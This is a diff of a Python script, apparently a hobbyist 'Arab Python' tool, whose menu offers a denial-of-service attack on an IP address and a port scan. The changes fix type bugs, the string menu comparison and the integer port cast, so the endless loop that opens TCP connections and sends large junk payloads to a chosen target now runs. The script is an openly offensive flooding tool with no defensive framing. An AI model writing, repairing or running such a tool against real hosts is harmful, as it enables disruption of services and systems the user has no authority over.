@@ -1,7 +1,7 @@
 import socket
 import time
 from platform import system
-import os
+import os , sys
 if system() == 'Linux':
     os.system('clear')
 elif system() == 'Windows':
@@ -12,7 +12,6 @@ Date_and_time_of_day = 'Time of day : '+time.ctime()
 The_developer_team = 'Arab Python'
 banner = """
                              """+__version__ +"""
-
                              """+Date_and_time_of_day+"""
  _____            _____       
 |  __ \          |  __ \     """+The_developer_team+"""
@@ -23,13 +22,11 @@ banner = """
                          __/ |
                         |___/ 
 1 - Dos Attack IP Address
-
 2 - Scan IP Address
-
 """
 print(banner)
 Enter_number = input("Enter the number :")
-if (Enter_number == 1):
+if (Enter_number == str(1)):
 	input_ip = str(input('\nEnter IP Address Plase :'))
 	input_port = input('\nEnter port open Plase :')
 	print("-"*30)
@@ -38,14 +35,14 @@ if (Enter_number == 1):
 	try:
 		while True:
 			sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-			connect = sock.connect((input_ip,input_port))
+			connect = sock.connect((input_ip,int(input_port)))
 			data = 'abcdefghjiklmnopqrstydlfkjlsfmlsmflsdmfldsmfklmsflsklfjsklfklsdfnmjsknrdklae'*1000
 			time.sleep(1)
 			sock.send(data.encode('utf-8'))
 			print ("Attacking for ip address ",input_ip,"port is ",input_port)
 	except socket.error as err:
 		raise err
-elif (Enter_number == 2):
+elif (Enter_number == str(2)):
 	input_ip2 = str(input('\nEnter IP Address Plase :'))
 	try:
 		print("-"*30)
@@ -61,4 +58,3 @@ elif (Enter_number == 2):
 	except KeyboardInterrupt:
 		print ("You stop this")
 		print("port closed",input_ip2,"--",socket.getservbyport(port))
-		sys.exit()
